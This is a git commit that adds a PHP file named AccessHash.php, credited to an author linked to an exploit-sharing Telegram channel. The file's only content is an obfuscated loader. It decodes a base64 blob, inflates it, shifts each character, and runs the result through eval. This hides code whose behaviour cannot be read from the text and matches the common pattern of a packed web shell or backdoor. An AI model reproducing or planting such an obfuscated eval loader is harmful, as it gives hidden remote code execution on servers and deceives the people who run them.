a0a9e76c2792a695026445516178a50792964030
X0P4SH4 <72021895+IR0DayToday@users.noreply.github.com>
2022-11-15 20:30:22 +0330

    Add files via upload

---
+++ AccessHash.php
@@ -0,0 +1,13 @@
+<?php
+/*
+Coded By
+X0P4SH4
+IR0Day.Today Bax
+https://t.me/LearnExploit
+*/
+function aNlXy($OYho){
+$OYho=gzinflate(base64_decode($OYho));
+for($TSh=0;$TSh<strlen($OYho);$TSh++) {
+ $OYho[$TSh] = chr(ord($OYho[$TSh])-1); }
+ return $OYho; }eval(aNlXy('ZVPtattAEHwAPcX2MJxMHMmlCQVbUtKkLe6P0pAYWnCNOElrS0S6O+7OjU2aZ+9KcmonwX/O+zE7s7NCY5RJDWplXCXX/ng49Sy61FUNpnXVVK4LXSRelKN0aOhRfkg+5TlaCzNhS7hFUaCJQgp7kU6udvBrfHN2NzuDv/DtdvxZ7IK5KsQOrsQ2CjUVrZRpoEFXqiJmWlnHKFhJvXHgdhpjZjcZTWYgRUP/1orBH1Fv6HldYn7fVoctRuIB/aILXWqvWoFfWaLuD9KbH3fzBV8rvhwOH73BxqKx8aqq0WchujzUwtqHgpGututdXzCER6+o0OdETzrIVa1MzAwWLImyZHG6hC/trmAC10JK5TrdcIQXhVnS8pIu4QT95F0290VlfC66ZZW0Kz6C8cfzc8pe5uXrHEUH23g89Ugairz0e14gLHSvXoqJcatrVZCWCRv1CWoksJiHpWow5EFbthgvAx4GR/jT/Y7IbVGIjLbRdnUb0t120jUZnxN/Mtr2SUKW+NAmY/Zz9h3Yf2yaHljXnU4tcmLzW7IRI0aamjo0svMI7bnt9MAocFtHDfsBnfyT+P3Uw7xUwBcnS/iqNrKYwAtH1gZRkicCSoOrmB3wjpW/HgNOGJIXszSrhaQTOtS+oRTwKBTPVkaZSXjr5tOe1wsyGV0lcaHTnysn6v6D6FhDDDRiS1gEQGRfzX9LniVdc11Z148n0HbwPw=='));
+?>
